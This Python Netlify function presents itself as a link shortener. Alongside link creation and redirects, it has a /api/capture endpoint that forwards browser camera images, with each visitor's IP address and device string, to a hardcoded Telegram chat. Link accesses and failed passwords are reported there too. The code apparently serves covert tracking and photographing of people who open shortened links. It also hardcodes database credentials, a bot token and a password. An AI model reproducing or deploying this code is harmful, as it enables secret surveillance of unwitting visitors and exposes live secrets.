import json
import os
import traceback
from datetime import datetime
import random
import string
from pymongo import MongoClient
from pymongo.server_api import ServerApi
import requests
import base64

# MongoDB Connection
MONGO_URI = "mongodb+srv://Anish_Gupta:Anish_Gupta@linkshortner.huk3frj.mongodb.net/?appName=LinkShortner"
try:
    client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
    db = client.link_shortener
    links_collection = db.links
    print("✅ MongoDB Connected Successfully")
except Exception as e:
    print(f"❌ MongoDB Connection Error: {e}")

# Telegram Bot Configuration
TELEGRAM_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
TELEGRAM_CHAT_ID = "6673230400"
PASSWORD = "@35678"

def send_telegram_message(text):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': text,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram message error: {e}")
        return False

def send_telegram_photo(image_data, caption=""):
    """Send photo to Telegram"""
    try:
        # Remove data URL prefix if present
        if image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]
        
        # Decode base64
        image_bytes = base64.b64decode(image_data)
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        
        files = {'photo': ('capture.jpg', image_bytes, 'image/jpeg')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        
        response = requests.post(url, files=files, data=data, timeout=10)
        
        if response.status_code != 200:
            error_msg = f"❌ Photo Send Failed: {response.text}"
            send_telegram_message(error_msg)
        
        return response.status_code == 200
    except Exception as e:
        error_msg = f"📸 Camera Error:\n{str(e)[:500]}"
        send_telegram_message(error_msg)
        return False

def log_error_to_telegram(error_type, error_details, user_info=None):
    """Log errors to Telegram"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"🚨 {error_type}\n"
        message += f"🕐 Time: {timestamp}\n"
        
        if user_info:
            message += f"🌐 IP: {user_info.get('ip', 'Unknown')}\n"
            message += f"📱 UA: {user_info.get('ua', 'Unknown')[:100]}\n"
        
        message += f"❌ Error: {error_details[:1000]}\n"
        
        send_telegram_message(message)
    except Exception as e:
        print(f"Failed to log error to Telegram: {e}")

def generate_short_code():
    """Generate random short code"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choices(characters, k=6))

def handler(event, context):
    """Main Netlify Function Handler"""
    
    # Get request details
    path = event['path']
    method = event['httpMethod']
    headers = event.get('headers', {})
    
    # User information for logging
    user_ip = headers.get('x-forwarded-for', 'Unknown').split(',')[0]
    user_agent = headers.get('user-agent', 'Unknown')
    user_info = {'ip': user_ip, 'ua': user_agent}
    
    # Set CORS headers
    cors_headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    }
    
    # Handle OPTIONS request
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': cors_headers,
            'body': ''
        }
    
    try:
        # Parse request body
        body = {}
        if event.get('body'):
            body = json.loads(event['body'])
        
        # Route handling
        if path == '/api/verify':
            if method == 'POST':
                password = body.get('password', '')
                
                # Log login attempt
                login_log = f"🔑 Login Attempt\n"
                login_log += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                login_log += f"🌐 IP: {user_ip}\n"
                login_log += f"📱 Device: {user_agent[:50]}"
                send_telegram_message(login_log)
                
                if password == PASSWORD:
                    # Successful login
                    success_log = f"✅ Successful Login\n"
                    success_log += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                    success_log += f"🌐 IP: {user_ip}"
                    send_telegram_message(success_log)
                    
                    return {
                        'statusCode': 200,
                        'headers': cors_headers,
                        'body': json.dumps({
                            'success': True,
                            'redirect': '/dashboard.html',
                            'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                        })
                    }
                else:
                    # Failed login
                    failed_log = f"❌ Failed Login\n"
                    failed_log += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                    failed_log += f"🌐 IP: {user_ip}\n"
                    failed_log += f"🔑 Attempt: {password}"
                    send_telegram_message(failed_log)
                    
                    return {
                        'statusCode': 401,
                        'headers': cors_headers,
                        'body': json.dumps({
                            'success': False,
                            'message': 'Incorrect password!'
                        })
                    }
        
        elif path == '/api/capture':
            if method == 'POST':
                image_data = body.get('image', '')
                
                if image_data:
                    caption = f"📸 Camera Capture\n"
                    caption += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                    caption += f"🌐 IP: {user_ip}\n"
                    caption += f"📱 Device: {user_agent[:50]}"
                    
                    send_telegram_photo(image_data, caption)
                
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({'success': True})
                }
        
        elif path == '/api/shorten':
            if method == 'POST':
                # Check auth
                auth_header = headers.get('authorization', '')
                if not auth_header.startswith('Bearer '):
                    return {
                        'statusCode': 401,
                        'headers': cors_headers,
                        'body': json.dumps({'success': False, 'message': 'Unauthorized'})
                    }
                
                original_url = body.get('url', '')
                if not original_url:
                    return {
                        'statusCode': 400,
                        'headers': cors_headers,
                        'body': json.dumps({'success': False, 'message': 'URL required'})
                    }
                
                # Generate short code
                short_code = generate_short_code()
                
                # Save to MongoDB
                link_data = {
                    'short_code': short_code,
                    'original_url': original_url,
                    'created_at': datetime.now(),
                    'click_count': 0,
                    'created_by': 'team'
                }
                
                links_collection.insert_one(link_data)
                
                # Log creation
                log_msg = f"🔗 Link Created\n"
                log_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                log_msg += f"📝 Code: {short_code}\n"
                log_msg += f"🔗 URL: {original_url[:50]}"
                send_telegram_message(log_msg)
                
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({
                        'success': True,
                        'short_url': f"https://{headers.get('host', 'your-site.netlify.app')}/l/{short_code}",
                        'short_code': short_code
                    })
                }
        
        elif path == '/api/links':
            if method == 'GET':
                # Check auth
                auth_header = headers.get('authorization', '')
                if not auth_header.startswith('Bearer '):
                    return {
                        'statusCode': 401,
                        'headers': cors_headers,
                        'body': json.dumps({'success': False, 'message': 'Unauthorized'})
                    }
                
                # Get recent links
                links = list(links_collection.find().sort('created_at', -1).limit(20))
                
                # Convert ObjectId to string
                for link in links:
                    link['_id'] = str(link['_id'])
                    link['created_at'] = link['created_at'].isoformat()
                
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({'success': True, 'links': links})
                }
        
        elif path == '/api/get-link':
            if method == 'GET':
                # Get short code from query params
                query_params = event.get('queryStringParameters', {})
                short_code = query_params.get('code', '')
                
                if not short_code:
                    return {
                        'statusCode': 400,
                        'headers': cors_headers,
                        'body': json.dumps({'success': False, 'message': 'Code required'})
                    }
                
                # Find link
                link = links_collection.find_one({'short_code': short_code})
                
                if link:
                    # Increment click count
                    links_collection.update_one(
                        {'short_code': short_code},
                        {'$inc': {'click_count': 1}}
                    )
                    
                    # Log access
                    access_log = f"👁️ Link Accessed\n"
                    access_log += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                    access_log += f"🌐 IP: {user_ip}\n"
                    access_log += f"🔗 Code: {short_code}"
                    send_telegram_message(access_log)
                    
                    link['_id'] = str(link['_id'])
                    return {
                        'statusCode': 200,
                        'headers': cors_headers,
                        'body': json.dumps({
                            'success': True,
                            'found': True,
                            'original_url': link['original_url']
                        })
                    }
                else:
                    return {
                        'statusCode': 404,
                        'headers': cors_headers,
                        'body': json.dumps({'success': False, 'message': 'Link not found'})
                    }
        
        elif path == '/api/log-error':
            if method == 'POST':
                error_data = body.get('error', {})
                
                error_log = f"🐛 Frontend Error\n"
                error_log += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                error_log += f"🌐 IP: {user_ip}\n"
                error_log += f"📄 Page: {error_data.get('page', 'Unknown')}\n"
                error_log += f"❌ Error: {error_data.get('message', 'Unknown')}\n"
                error_log += f"📍 Location: {error_data.get('location', 'Unknown')}"
                
                send_telegram_message(error_log)
                
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({'success': True})
                }
        
        # Route not found
        return {
            'statusCode': 404,
            'headers': cors_headers,
            'body': json.dumps({'success': False, 'message': 'Endpoint not found'})
        }
    
    except Exception as e:
        # Log server error
        error_trace = traceback.format_exc()
        log_error_to_telegram("Server Error", f"{str(e)}\n{error_trace}", user_info)
        
        return {
            'statusCode': 500,
            'headers': cors_headers,
            'body': json.dumps({
                'success': False,
                'message': 'Internal server error',
                'error': str(e)
            })
}
